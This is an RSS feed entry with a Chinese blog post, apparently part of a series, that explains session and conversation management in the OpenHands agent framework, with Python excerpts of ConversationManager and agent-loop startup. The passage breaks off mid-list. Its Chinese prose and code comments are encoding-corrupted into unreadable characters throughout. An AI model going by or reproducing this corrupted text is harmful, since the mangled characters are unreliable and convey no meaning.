<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-02-02T13:15:30.887Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ AI Agent æ¡æ¶æ¢ç§ï¼æè§£ OpenHandsï¼5ï¼--- äº¤äº&ä¼è¯ ]]></title>
    <link>https://www.cnblogs.com/rossiXYZ/p/19560009</link>
    <guid>f949f75843af12fab9ce6cb9a499c337</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/rossiXYZ/p/19560009" title="åå¸äº 2026-02-02 20:54">
    <span role="heading" aria-level="2">AI Agent æ¡æ¶æ¢ç§ï¼æè§£ OpenHandsï¼5ï¼--- äº¤äº&amp;ä¼è¯</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="ai-agent-æ¡æ¶æ¢ç§æè§£-openhands5----äº¤äºä¼è¯">AI Agent æ¡æ¶æ¢ç§ï¼æè§£ OpenHandsï¼5ï¼--- äº¤äº&amp;ä¼è¯</h1>
<p></p><div class="toc"><div class="toc-container-header">ç®å½</div><ul><li><a href="#ai-agent-æ¡æ¶æ¢ç§æè§£-openhands5----äº¤äºä¼è¯" rel="noopener nofollow">AI Agent æ¡æ¶æ¢ç§ï¼æè§£ OpenHandsï¼5ï¼--- äº¤äº&amp;ä¼è¯</a><ul><li><a href="#0x00-æ¦è¿°" rel="noopener nofollow">0x00 æ¦è¿°</a></li><li><a href="#0x01-èæ¯" rel="noopener nofollow">0x01 èæ¯</a><ul><li><a href="#11-ä¼è¯çæä¹" rel="noopener nofollow">1.1 ä¼è¯çæä¹</a></li><li><a href="#12-ä¼è¯ç³»ç»çå¸¸è§åè½" rel="noopener nofollow">1.2 ä¼è¯ç³»ç»çå¸¸è§åè½</a></li><li><a href="#13-session-å¸¸è§åå®¹" rel="noopener nofollow">1.3 Session å¸¸è§åå®¹</a></li><li><a href="#14-ä¼è¯çå½å¨æ" rel="noopener nofollow">1.4 ä¼è¯çå½å¨æ</a></li><li><a href="#15--åæåé¡¾" rel="noopener nofollow">1.5  åæåé¡¾</a></li></ul></li><li><a href="#0x02-openhands-ä¼è¯ç³»ç»" rel="noopener nofollow">0x02 OpenHands ä¼è¯ç³»ç»</a><ul><li><a href="#21-å¯¹è¯ç®¡çæ¥å£-conversationmanager" rel="noopener nofollow">2.1 å¯¹è¯ç®¡çæ¥å£ ConversationManager</a><ul><li><a href="#211-standaloneconversationmanager" rel="noopener nofollow">2.1.1 StandaloneConversationManager</a></li><li><a href="#212-sessionåå§å" rel="noopener nofollow">2.1.2 Sessionåå§å</a></li></ul></li><li><a href="#22-sessionpywebsession" rel="noopener nofollow">2.2 session.pyï¼WebSessionï¼</a><ul><li><a href="#221-websession-ç±»æ¦è¿°" rel="noopener nofollow">2.2.1 WebSession ç±»æ¦è¿°</a></li><li><a href="#222-websession-æ ¸å¿å±æ§" rel="noopener nofollow">2.2.2 WebSession æ ¸å¿å±æ§</a></li><li><a href="#223-ä¸»è¦åè½æ¨¡å" rel="noopener nofollow">2.2.3 ä¸»è¦åè½æ¨¡å</a></li><li><a href="#224-ä¸ç³»ç»å¶ä»ç»ä»¶çå³ç³»" rel="noopener nofollow">2.2.4 ä¸ç³»ç»å¶ä»ç»ä»¶çå³ç³»</a></li><li><a href="#225-åå§å-agentsession" rel="noopener nofollow">2.2.5 åå§å AgentSession</a></li></ul></li><li><a href="#23-agent_session" rel="noopener nofollow">2.3 agent_session</a><ul><li><a href="#231-agentsession" rel="noopener nofollow">2.3.1 AgentSession</a></li><li><a href="#242-åå§åagent" rel="noopener nofollow">2.4.2 åå§åAgent</a><ul><li><a href="#æ ¸å¿ä½ç¨" rel="noopener nofollow">æ ¸å¿ä½ç¨</a></li><li><a href="#æ ¸å¿ç¹è²" rel="noopener nofollow">æ ¸å¿ç¹è²</a></li><li><a href="#åå§åæµç¨å¾" rel="noopener nofollow">åå§åæµç¨å¾</a></li></ul></li></ul></li><li><a href="#24-ç¨æ·äº¤äºoh_user_actioné»è¾" rel="noopener nofollow">2.4 ç¨æ·äº¤äº(oh_user_action)é»è¾</a><ul><li><a href="#241-ç¨æ·åæ¶æ¯" rel="noopener nofollow">2.4.1 ç¨æ·åæ¶æ¯</a></li><li><a href="#242-äºä»¶æ·»å " rel="noopener nofollow">2.4.2 äºä»¶æ·»å </a></li><li><a href="#243-äºä»¶å¤ç" rel="noopener nofollow">2.4.3 äºä»¶å¤ç</a></li></ul></li></ul></li><li><a href="#0xff-åè" rel="noopener nofollow">0xFF åè</a></li></ul></li></ul></div><p></p>
<h2 id="0x00-æ¦è¿°">0x00 æ¦è¿°</h2>
<p>ææä¹çå¤è½®å¯¹è¯è¦æ±æºè½ä½è½å¤çè§£ä¸ä¸æãå°±åäººç±»ä¸æ ·ï¼æºè½ä½éè¦è®°ä½å¯¹è¯åå²ï¼å·²ç»è¯´è¿ååè¿ä»ä¹ï¼ä»¥ä¿æè¿è´¯æ§å¹¶é¿åéå¤ã</p>
<p>ä»¥ä¸æ¯OpenHands Applicationsçç¤ºä¾å¾ï¼æ¬ç¯å°±æ¥ççä¼è¯åäº¤äºå¦ä½è¿è¡ã</p>
<p><img alt="openhands-sdk" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1850883/202602/1850883-20260201082058097-1896025149.jpg" class="lazyload"></p>
<p>å ä¸ºæ¬ç³»ååé´çæç« è¿å¤ï¼å¯è½å¨åèæç®ä¸­æéæ¼çæç« ï¼å¦ææï¼è¿è¯·å¤§å®¶æåºã</p>
<h2 id="0x01-èæ¯">0x01 èæ¯</h2>
<p>æ¬èåºäº Google ADK æ¥è¿è¡èæ¯ä»ç»ã</p>
<h3 id="11-ä¼è¯çæä¹">1.1 ä¼è¯çæä¹</h3>
<p>å°±åä½ ä¸ä¼æ¯æ¬¡åç­ä¿¡é½ä»å¤´å¼å§ä¸æ ·ï¼æºè½ä½ä¹éè¦äºè§£å½åäº¤äºçä¸ä¸æãå¸¸è§çAgentç³»ç»ä¼éè¿ <code>Session</code>ã<code>State</code> å <code>Memory</code> æä¾äºç»æåçä¸ä¸æç®¡çæ¹å¼ã</p>
<ol>
<li><strong><code>Session</code></strong>ï¼å½åå¯¹è¯çº¿ç¨ï¼å¯ä»¥å°ä½ ä¸æºè½ä½çä¸åå¯¹è¯å®ä¾è§ä¸ºç¬ç«ç<strong>å¯¹è¯çº¿ç¨</strong>ï¼å®ä»¬å¯è½ä¼å©ç¨<strong>é¿æç¥è¯</strong>ï¼
<ul>
<li>è¡¨ç¤ºç¨æ·ä¸ä½ çæºè½ä½ç³»ç»ä¹é´<em>åæ¬¡ãæç»­çäº¤äº</em>ã</li>
<li>åå«è¯¥ç¹å®äº¤äºæé´ï¼æºè½ä½éåçæ¶æ¯åå¨ä½ï¼ç§°ä¸º <code>Events</code>ï¼çæ¶é´é¡ºåºåºåã</li>
<li>ä¸ä¸ª <code>Session</code> è¿å¯ä»¥ä¿å­ä»å¨<em>æ¬æ¬¡å¯¹è¯</em>æé´ç¸å³çä¸´æ¶æ°æ®ï¼<code>State</code>ï¼ã</li>
</ul>
</li>
<li><code>State</code>ï¼å½åå¯¹è¯ä¸­çæ°æ®
<ul>
<li>å­å¨å¨ç¹å® <code>Session</code> åçæ°æ®ã</li>
<li>ç¨äºç®¡ç<em>ä»</em>ä¸<em>å½åï¼åæ¬¡ï¼ãæ´»è·</em>å¯¹è¯çº¿ç¨ç¸å³çä¿¡æ¯ï¼ä¾å¦ï¼<em>æ¬æ¬¡å¯¹è¯</em>ä¸­çè´­ç©è½¦ååï¼<em>æ¬ Session</em> ä¸­æå°çç¨æ·åå¥½ï¼ã</li>
<li>å³æ³¨å¦ä½é«æå°è¯»åãåå¥åç®¡ç session ä¸å±æ°æ®ã</li>
</ul>
</li>
<li><code>Memory</code>ï¼å¯æ£ç´¢çè·¨ Session ä¿¡æ¯
<ul>
<li>è¡¨ç¤ºå¯è½è·¨è¶<em>å¤ä¸ªè¿å» Session</em>æåå«å¤é¨æ°æ®æºçä¿¡æ¯å­å¨ã</li>
<li>å®ä½ä¸ºä¸ä¸ªç¥è¯åºï¼æºè½ä½å¯ä»¥<em>æ£ç´¢</em>ä»¥åå¿è¶åºå½åå¯¹è¯çä¿¡æ¯æä¸ä¸æã</li>
</ul>
</li>
</ol>
<p>å æ­¤ï¼Agentç³»ç»ä¸è¬æå¦ä¸ä¸¤å¥ç»ä»¶æèæå¡ï¼</p>
<ul>
<li><strong><code>SessionService</code></strong>ï¼ç®¡çä¸åçå¯¹è¯çº¿ç¨ï¼<code>Session</code> å¯¹è±¡ï¼è´è´£çå½å¨æç®¡çï¼åå»ºãæ£ç´¢ãæ´æ°ï¼è¿½å  <code>Events</code>ãä¿®æ¹ <code>State</code>ï¼åå é¤åä¸ª <code>Session</code>ã</li>
<li><strong><code>MemoryService</code></strong>ï¼ç®¡çé¿æç¥è¯å­å¨ï¼<code>Memory</code>ï¼ï¼è´è´£å°ä¿¡æ¯ï¼éå¸¸æ¥èªå·²å®æç <code>Session</code>ï¼å¯¼å¥é¿æå­å¨ãæä¾åºäºæ¥è¯¢æ£ç´¢å·²å­å¨ç¥è¯çæ¹æ³ã</li>
</ul>
<p>æ¬ç¯ä»ç»å¯¹è¯æå¡ï¼åç»­å¦å¤ä»ç»åå­æå¡ã</p>
<h3 id="12-ä¼è¯ç³»ç»çå¸¸è§åè½">1.2 ä¼è¯ç³»ç»çå¸¸è§åè½</h3>
<p>ç¨æ·éå¸¸ä¸ä¼ç´æ¥åå»ºæç®¡ç <code>Session</code> å¯¹è±¡ï¼èæ¯éè¿ <strong><code>SessionService</code></strong>ãè¯¥æå¡ä½ä¸ºä¼è¯çå½å¨æçä¸­å¤®ç®¡çèãå¶æ ¸å¿èè´£åæ¬ï¼</p>
<ul>
<li><strong>å¼å¯æ°å¯¹è¯ï¼</strong> å½ç¨æ·å¼å§äº¤äºæ¶ï¼åå»ºæ°ç <code>Session</code> å¯¹è±¡ã</li>
<li><strong>æ¢å¤å·²æå¯¹è¯ï¼</strong> éè¿ ID æ£ç´¢ç¹å® <code>Session</code>ï¼è®©æºè½ä½å¯ä»¥ä»ä¸æ¬¡ä¸­æ­å¤ç»§ç»­ã</li>
<li><strong>ä¿å­è¿åº¦ï¼</strong> å°æ°çäº¤äºï¼<code>Event</code> å¯¹è±¡ï¼è¿½å å° session åå²ãè¿ä¹æ¯ session <code>state</code> æ´æ°çæºå¶ï¼è¯¦è§ <code>State</code> ç« èï¼ã</li>
<li><strong>ååºå¯¹è¯ï¼</strong> æ¥æ¾ç¹å®ç¨æ·ååºç¨çæ´»è·ä¼è¯çº¿ç¨ã</li>
<li><strong>æ¸çï¼</strong> å½å¯¹è¯ç»ææä¸åéè¦æ¶ï¼å é¤ <code>Session</code> åå¶ç¸å³æ°æ®ã</li>
</ul>
<p>éæ©åéç <code>SessionService</code> æ¯å³å®æºè½ä½å¯¹è¯åå²åä¸´æ¶æ°æ®å¦ä½å­å¨ä¸æä¹åçå³é®ã</p>
<h3 id="13-session-å¸¸è§åå®¹">1.3 Session å¸¸è§åå®¹</h3>
<p>ä¸è¬æ¥è¯´ï¼å½ç¨æ·å¼å§ä¸æºè½ä½äº¤äºæ¶ï¼<code>SessionService</code> ä¼åå»ºä¸ä¸ª <code>Session</code> å¯¹è±¡ãè¯¥å¯¹è±¡ä½ä¸º<em>åä¸ªå¯¹è¯çº¿ç¨</em>ç¸å³ææåå®¹çå®¹å¨ãå¶ä¸»è¦å±æ§å¦ä¸ï¼</p>
<ol>
<li>æ è¯ä¿¡æ¯ï¼<code>id</code>, <code>appName</code>, <code>userId</code>ï¼ï¼</li>
</ol>
<p>ç¨äºå¯ä¸æ è®°å¯¹è¯çæ ¸å¿å­æ®µï¼å·ä½è¯´æå¦ä¸ï¼</p>
<ul>
<li><code>id</code>ï¼å½åå¯¹è¯çº¿ç¨çå¯ä¸æ è¯ç¬¦ï¼æ¯åç»­æ£ç´¢è¯¥å¯¹è¯çå³é®ä¾æ®ãä¸ä¸ª <code>SessionService</code> å¯¹è±¡å¯ç®¡çå¤ä¸ª <code>Session</code>ï¼ä¼è¯ï¼å®ä¾ï¼æ­¤å­æ®µç¨äºæç¡®å½åæä½å¯¹åºçå·ä½ä¼è¯å¯¹è±¡ãç¤ºä¾å¼ï¼"test_id_modification"ã</li>
<li><code>app_name</code>ï¼æ è¯å½åå¯¹è¯æå±çæºè½ä½åºç¨ãç¤ºä¾å¼ï¼"id_modifier_workflow"ã</li>
<li><code>userId</code>ï¼å°å¯¹è¯ä¸ç¹å®ç¨æ·å³èçå³èå­æ®µï¼ç¨äºç¨æ·ç»´åº¦çå¯¹è¯ç®¡çä¸æéæ§å¶ã</li>
</ul>
<ol start="2">
<li>å¯¹è¯åå²ï¼<code>events</code>ï¼ï¼</li>
</ol>
<p>ææ¶é´é¡ºåºæåçäº¤äºåºåï¼åå«å½åå¯¹è¯çº¿ç¨ä¸­åççææäº¤äºè¡ä¸ºï¼ä»¥ <code>Event</code> å¯¹è±¡å½¢å¼å­å¨ï¼ï¼æ¶µçç¨æ·æ¶æ¯ãæºè½ä½ååºãå·¥å·è°ç¨å¨ä½ç­å¨éäº¤äºè®°å½ã</p>
<ol start="3">
<li>ä¼è¯ç¶æï¼<code>state</code>ï¼ï¼</li>
</ol>
<p>ç¨äºå­å¨<strong>ä»ä¸å½åæ´»è·å¯¹è¯ç¸å³çä¸´æ¶æ°æ®</strong>ï¼ç¸å½äºæºè½ä½å¨äº¤äºè¿ç¨ä¸­ç âä¸´æ¶èç¨¿æ¬âãä¸ä¸èå°è¯¦ç»ä»ç» <code>state</code> çå·ä½ä½¿ç¨ä¸ç®¡çæ¹å¼ã</p>
<ol start="4">
<li>æ´»å¨è¿½è¸ªï¼<code>lastUpdateTime</code>ï¼ï¼</li>
</ol>
<p>æ¶é´æ³å­æ®µï¼è®°å½å½åå¯¹è¯çº¿ç¨ä¸­æåä¸æ¬¡äº¤äºäºä»¶çåçæ¶é´ï¼ç¨äºä¼è¯æ´»è·åº¦å¤æ­ä¸è¿æç®¡çã</p>
<h3 id="14-ä¼è¯çå½å¨æ">1.4 ä¼è¯çå½å¨æ</h3>
<p><img alt="Session lifecycle" loading="lazy" data-src="https://adk.wiki/assets/session_lifecycle.png" class="lazyload"></p>
<p>ä»¥ä¸æ¯ <code>Session</code> ä¸ <code>SessionService</code> å¨ä¸æ¬¡å¯¹è¯è½®æ¬¡ä¸­åä½çç®åæµç¨ï¼</p>
<ol>
<li><strong>å¼å§ææ¢å¤ï¼</strong> ä½ çåºç¨ç¨åºéè¦ä½¿ç¨ <code>SessionService</code> æ¥è¦ä¹ <code>create_session</code>ï¼ç¨äºæ°èå¤©ï¼ï¼è¦ä¹ä½¿ç¨ç°æç session idã</li>
<li><strong>æä¾ä¸ä¸æï¼</strong> <code>Runner</code> ä»éå½çæå¡æ¹æ³è·åç¸åºç <code>Session</code> å¯¹è±¡ï¼ä¸ºæºè½ä½æä¾å¯¹ç¸åº Session ç <code>state</code> å <code>events</code> çè®¿é®æéã</li>
<li><strong>æºè½ä½å¤çï¼</strong> ç¨æ·ç¨æ¥è¯¢æç¤ºæºè½ä½ãæºè½ä½åææ¥è¯¢ä»¥åå¯è½ç session <code>state</code> å <code>events</code> åå²æ¥ç¡®å®ååºã</li>
<li><strong>ååºåç¶ææ´æ°ï¼</strong> æºè½ä½çæååºï¼å¹¶å¯è½æ è®°è¦å¨ <code>state</code> ä¸­æ´æ°çæ°æ®ï¼ã<code>Runner</code> å°å¶æåä¸º <code>Event</code>ã</li>
<li><strong>ä¿å­äº¤äºï¼</strong> <code>Runner</code> è°ç¨ <code>sessionService.append_event(session, event)</code>ï¼å° <code>session</code> åæ°ç <code>event</code> ä½ä¸ºåæ°ãæå¡å° <code>Event</code> æ·»å å°åå²è®°å½ä¸­ï¼å¹¶æ ¹æ®äºä»¶ä¸­çä¿¡æ¯æ´æ°å­å¨ä¸­ç session <code>state</code>ãsession ç <code>last_update_time</code> ä¹ä¼å¾å°æ´æ°ã</li>
<li><strong>åå¤ä¸ä¸æ¬¡ï¼</strong> æºè½ä½çååºåéç»ç¨æ·ãæ´æ°åç <code>Session</code> ç°å¨ç± <code>SessionService</code> å­å¨ï¼åå¤è¿è¡ä¸ä¸è½®ï¼è¿éå¸¸ä¼å¨å½åä¼è¯ä¸­ç»§ç»­å¯¹è¯ï¼ä»æ­¥éª¤ 1 éæ°å¼å§å¾ªç¯ï¼ã</li>
<li><strong>ç»æå¯¹è¯ï¼</strong> å½å¯¹è¯ç»ææ¶ï¼ä½ çåºç¨ç¨åºè°ç¨ <code>sessionService.delete_session(...)</code> æ¥æ¸çå­å¨çä¼è¯æ°æ®ï¼å¦æä¸åéè¦çè¯ï¼ã</li>
</ol>
<p>æ­¤å¾ªç¯çªåºæ¾ç¤ºäº <code>SessionService</code> å¦ä½éè¿ç®¡çæ¯ä¸ª <code>Session</code> å¯¹è±¡çåå²åç¶æï¼ç¡®ä¿å¯¹è¯çè¿ç»­æ§ã</p>
<h3 id="15--åæåé¡¾">1.5  åæåé¡¾</h3>
<p>æä»¬é¦ååé¡¾åæä»ç»çï¼OpenHandsé¡¹ç®å³äºå¯¹è¯çæå¡å¨ç«¯ç»ä»¶ã</p>
<ul>
<li><code>session.py</code> æä»¶å®ä¹äº<code>Session</code>ç±»ï¼å®ä»£è¡¨ä¸å®¢æ·ç«¯çWebSocketä¼è¯ã</li>
<li><code>agent_session.py</code> æä»¶åå«<code>AgentSession</code>ç±»ï¼å®ç®¡çä¼è¯åAgentççå½å¨æã</li>
<li><code>conversation_manager.py</code> æä»¶å®ä¹äº<code>ConversationManager</code>ç±»ï¼å®è´è´£ç®¡çå¤ä¸ªå®¢æ·ç«¯ä¼è¯ã</li>
<li><code>listen.py</code> æä»¶æ¯ä¸»æå¡å¨æä»¶ï¼å®è®¾ç½®FastAPIåºç¨ç¨åºå¹¶å®ä¹åç§APIç«¯ç¹ãæ­¤å¤å³é®ä¸æ­¥ä¸ºä¸ä¼è¯ç®¡çå¨ ConversationManager å»ºç«è¿æ¥ã</li>
</ul>
<p>ä»¥ä¸å æ­¥å±ç¤ºäºæå¡å¨ç»ä»¶å¦ä½æå»ºä¼è¯ï¼å æ­¤æä»¬ç±æ­¤èå¥ã</p>
<h2 id="0x02-openhands-ä¼è¯ç³»ç»">0x02 OpenHands ä¼è¯ç³»ç»</h2>
<p>ä¼è¯æ¯ä¸é¨è®¾è®¡ç¨äºè·è¸ªåç®¡çåç¬å¯¹è¯çº¿ç¨çå¯¹è±¡ãä¼è¯å°±å¯ä»¥çè§£ä¸ºAIä»£ççä¸´æ¶å·¥ä½ç©ºé´ï¼å°±åä½ ä¸ºç¹å®é¡¹ç®åå¤çåå¬æ¡ãå®åå«å½åå¯¹è¯çææå¿è¦å·¥å·ãç¬è®°ååèèµæï¼ä¸åé½æ¯å³æ¶å¯è®¿é®çï¼ä½ä¹å·æä¸´æ¶æ§åä»»å¡ç¹å®æ§ã</p>
<p>å·ä½èè¨ï¼å¨OpenHandsä¸­ï¼</p>
<ul>
<li><code>WebSession</code> æ¯ä¸ä¸ª Web æå¡å¨ç»å®çä¼è¯åè£å¨ï¼<strong>è´è´£ç®¡çåä¸ª Web å®¢æ·ç«¯è¿æ¥å¹¶åè° AgentSession çå½å¨æ</strong>ãæ¯ OpenHands ç³»ç»ä¸­è¿æ¥åç«¯ç¨æ·çé¢ååç«¯Agentæ§è¡çæ ¸å¿æ¡¥æ¢ï¼è´è´£åè°æ´ä¸ªäº¤äºæµç¨ã</li>
<li><code>AgentSession</code> æ¯ OpenHands æ¡æ¶ä¸­ <strong>Agentè¿è¡ç âä¸ä¸æå®¹å¨â</strong>ï¼æ ¸å¿ä½ç¨æ¯å°è£Agentæ§è¡æéçææç»ä»¶ï¼Agentãæ§å¶å¨ãè¿è¡æ¶ãåå­ãäºä»¶æµï¼ï¼ç»ä¸ç®¡çå®ä»¬ççå½å¨æï¼åå§åãå¯å¨ãéä¿¡ãå³é­ï¼ï¼å¹¶æä¾ä¼è¯çº§çéç½®éç¦»ãæ°æ®æä¹ååç¶æç®¡çï¼æ¯Agentè½å¤ç¬ç«ãç¨³å®æ§è¡ä»»å¡çåºç¡ã</li>
</ul>
<h3 id="21-å¯¹è¯ç®¡çæ¥å£-conversationmanager">2.1 å¯¹è¯ç®¡çæ¥å£ ConversationManager</h3>
<p>ConversationManager ç±»å®ä¹äºå¯¹è¯ç®¡ççæ¥å£ï¼éç¨äºåæºæ¨¡å¼åéç¾¤æ¨¡å¼ãå®è´è´£å¤çå¯¹è¯çå¨çå½å¨æï¼<br>
åæ¬åå»ºãéå ãåç¦»åæ¸çãè¿æ¯OpenHandsçä¸ä¸ªæ©å±ç¹ï¼åºäºå®æå»ºçåºç¨å¯éè¿æå¡å¨éç½®ä¿®æ¹è¡ä¸ºï¼æ éæ¹å¨å¶æ ¸å¿ä»£ç ãåºç¨ç¨åºå¯éè¿ä»¥ä¸æ¹å¼æä¾èªå®ä¹å®ç°ï¼</p>
<ol>
<li>åå»ºä¸ä¸ªç»§æ¿èªConversationManagerçç±»</li>
<li>å®ç°ææå¿éçæ½è±¡æ¹æ³</li>
<li>å°server_config.conversation_manager_classè®¾ç½®ä¸ºè¯¥å®ç°ç±»çå¨éå®å</li>
</ol>
<p>ConversationManager å®ä¹å¦ä¸ã</p>
<pre><code class="language-python">class ConversationManager(ABC):
    """OpenHandsä¸­å¯¹è¯ç®¡ççæ½è±¡åºç±»ã
    åºç¨ç¨åºå¯è½éè¦å¨ä»¥ä¸åºæ¯ä¸­èªå®ä¹å®ç°ï¼
    - å·æåå¸å¼å¯¹è¯ç¶æçéç¾¤é¨ç½²
    - èªå®ä¹æä¹åæç¼å­ç­ç¥
    - ä¸å¤é¨å¯¹è¯ç®¡çç³»ç»éæ
    - å¢å¼ºççæ§ææ¥å¿è½å
    å®ç°ç±»éè¿openhands.server.shared.pyä¸­çget_impl()æ¹æ³å®ä¾åã
    """

    sio: socketio.AsyncServer  # Socket.IOå¼æ­¥æå¡å¨å®ä¾ï¼ç¨äºå®æ¶éä¿¡
    config: OpenHandsConfig    # OpenHandséç½®å¯¹è±¡ï¼å­å¨ç³»ç»åæ°
    file_store: FileStore      # æä»¶å­å¨å®ä¾ï¼ç¨äºç®¡çå¯¹è¯ç¸å³æä»¶
    conversation_store: ConversationStore  # å¯¹è¯å­å¨å®ä¾ï¼ç¨äºæä¹åå¯¹è¯æ°æ®
</code></pre>
<h4 id="211-standaloneconversationmanager">2.1.1 StandaloneConversationManager</h4>
<p>StandaloneConversationManager æ¯ConversationManagerçå­ç±»ãæ¯é»è®¤å®ç°ï¼éç¨äºåæå¡å¨é¨ç½²åºæ¯ã</p>
<pre><code class="language-python">@dataclass
class StandaloneConversationManager(ConversationManager):
    """Default implementation of ConversationManager for single-server deployments.

    See ConversationManager for extensibility details.
    """

    sio: socketio.AsyncServer
    config: OpenHandsConfig
    file_store: FileStore
    server_config: ServerConfig
    # Defaulting monitoring_listener for temp backward compatibility.
    monitoring_listener: MonitoringListener = MonitoringListener()
    _local_agent_loops_by_sid: dict[str, Session] = field(default_factory=dict)
    _local_connection_id_to_session_id: dict[str, str] = field(default_factory=dict)
    _active_conversations: dict[str, tuple[ServerConversation, int]] = field(
        default_factory=dict
    )
    _detached_conversations: dict[str, tuple[ServerConversation, float]] = field(
        default_factory=dict
    )
    _conversations_lock: asyncio.Lock = field(default_factory=asyncio.Lock)
    _cleanup_task: asyncio.Task | None = None
    _conversation_store_class: type[ConversationStore] | None = None
    _loop: asyncio.AbstractEventLoop | None = None

</code></pre>
<h4 id="212-sessionåå§å">2.1.2 Sessionåå§å</h4>
<p>Sessionåå§åçæµç¨å¾å¦ä¸ã</p>
<p><img alt="openhands-4.1-1" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1850883/202602/1850883-20260201082144982-1043900741.png" class="lazyload"></p>
<p>StandaloneConversationManager ç  join_conversation å½æ°å¦ä¸ï¼å¶è°ç¨äº maybe_start_agent_loop åå§åAgentãéè¦æ³¨æï¼æ­¤å¤ Session æ¯ WebSessionã</p>
<pre><code class="language-python">    from openhands.server.session.session import WebSession as Session

    async def join_conversation(
        self,
        sid: str,
        connection_id: str,
        settings: Settings,
        user_id: str | None,
    ) -&gt; AgentLoopInfo:
        await self.sio.enter_room(connection_id, ROOM_KEY.format(sid=sid))
        self._local_connection_id_to_session_id[connection_id] = sid
        # æ­¤å¤è°ç¨ maybe_start_agent_loop
        agent_loop_info = await self.maybe_start_agent_loop(sid, settings, user_id)
        return agent_loop_info

</code></pre>
<p>maybe_start_agent_loop è°ç¨äº _start_agent_loop åå§å Sessionã</p>
<pre><code class="language-python">class ConversationManager:
    def __init__(self, config: OpenHandsConfig, sio: Any, file_store: Any):
        self.config = config  # æ¡æ¶å¨å±éç½®
        self.sio = sio  # SocketIOå®ä¾ï¼ç¨äºå®¢æ·ç«¯éä¿¡ï¼
        self.file_store = file_store  # æä»¶å­å¨å®ä¾ï¼ç¨äºä¼è¯æ°æ®æä¹åï¼
        self._local_agent_loops_by_sid: Dict[str, Session] = {}  # ä¼è¯IDå°Sessionå®ä¾çæ å°ï¼ç¼å­æ´»è·ä¼è¯ï¼
        self._loop = asyncio.get_event_loop()  # äºä»¶å¾ªç¯å®ä¾

    async def maybe_start_agent_loop(
        self,
        sid: str,  # ä¼è¯IDï¼å¯ä¸æ è¯ä¸ä¸ªå¯¹è¯ï¼
        settings: Settings,  # ç¨æ·/ä¼è¯è®¾ç½®ï¼å«Agentç±»åãLLMéç½®ç­ï¼
        user_id: Optional[str] = None,  # ç¨æ·IDï¼å¯éï¼ç¨äºç¨æ·çº§å¹¶åæ§å¶ï¼
        initial_user_msg: Optional[MessageAction] = None,  # åå§ç¨æ·æ¶æ¯ï¼å¯éï¼ä¼è¯å¯å¨æ¶çç¬¬ä¸æ¡æ¶æ¯ï¼
        replay_json: Optional[str] = None,  # åæ¾JSONå­ç¬¦ä¸²ï¼å¯éï¼ç¨äºä¼è¯åæ¾åºæ¯ï¼
    ) -&gt; AgentLoopInfo:
        """
        å°è¯å¯å¨Agentå¾ªç¯ï¼ä¼åå¤ç¨å·²å­å¨çä¼è¯ï¼ä¸å­å¨åæ°å»ºã
        
        æ ¸å¿é»è¾ï¼
        - æ£æ¥ä¼è¯IDå¯¹åºçä¼è¯æ¯å¦å·²å­å¨ï¼ç¼å­äº_local_agent_loops_by_sidï¼
        - å­å¨åç´æ¥è¿åä¼è¯ä¿¡æ¯ï¼ä¸å­å¨åè°ç¨_start_agent_loopæ°å»ºä¼è¯
        - è¿åæ ååçAgentå¾ªç¯ä¿¡æ¯ï¼ä¾å¤é¨è°ç¨èä½¿ç¨ï¼
        """     
        # ä»ç¼å­ä¸­è·åä¼è¯ï¼å¤ç¨å·²æä¼è¯ï¼é¿åéå¤åå§åï¼
        session = self._local_agent_loops_by_sid.get(sid)
        if not session:
            # ä¼è¯ä¸å­å¨ï¼æ°å»ºAgentå¾ªç¯
            session = await self._start_agent_loop(
                sid, settings, user_id, initial_user_msg, replay_json
            )
        
        # å°Sessionå®ä¾è½¬æ¢ä¸ºæ ååçAgentLoopInfoè¿å
        return self._agent_loop_info_from_session(session)
</code></pre>
<p>_start_agent_loop è¯¥ä»£ç æ¯ OpenHands æ¡æ¶ä¸­ <strong>Agentå¾ªç¯ï¼Agent Loopï¼çå¯å¨ä¸ç®¡çæ ¸å¿</strong>ï¼è´è´£ä¼è¯çåå»ºãå¤ç¨ãå¹¶åæ§å¶ååå§åï¼æ¯è¿æ¥ç¨æ·è¯·æ±ä¸Agentæ§è¡çå³é®æ¢çº½ãå¶æ ¸å¿ä½¿å½æ¯ï¼å¨éµå®å¹¶åéå¶çåæä¸ï¼ä¸ºç¨æ·ä¼è¯æä¾å®æ´çç»ä»¶åå§åï¼LLM æ³¨åè¡¨ãç»è®¡ãäºä»¶è®¢éï¼ï¼ç¡®ä¿Agentè½å¤é¡ºçå¯å¨å¹¶è¿è¡ã</p>
<p>_start_agent_loop  çæ ¸å¿ç¹è²å¦ä¸ï¼</p>
<ol>
<li><strong>ä¼è¯å¤ç¨æºå¶</strong>ï¼éè¿ <code>_local_agent_loops_by_sid</code> ç¼å­æ´»è·ä¼è¯ï¼é¿åéå¤åå§åï¼æåååºéåº¦åèµæºå©ç¨çï¼ä¾å¦ç¨æ·éæ°è¿æ¥åä¸ä¼è¯æ¶ç´æ¥å¤ç¨ï¼ã</li>
<li><strong>æºè½å¹¶åæ§å¶</strong>ï¼åºäºç¨æ· ID éå¶æå¤§å¹¶åä¼è¯æ°ï¼è¶éåèªå¨å³é­ææ©çä¼è¯ï¼åæ¶åå®¢æ·ç«¯åéåå¥½éç¥ï¼å¹³è¡¡èµæºå ç¨ä¸ç¨æ·ä½éªã</li>
<li><strong>ç»ä»¶ååå§å</strong>ï¼æ´å <code>create_registry_and_conversation_stats</code> å½æ°ï¼ä¸é®å®æ LLM æ³¨åè¡¨ãå¯¹è¯ç»è®¡ãéç½®ééä¸å¤§æ ¸å¿ç»ä»¶çåå§åï¼æ¶ææ¸æ°ä¸è§£è¦ã</li>
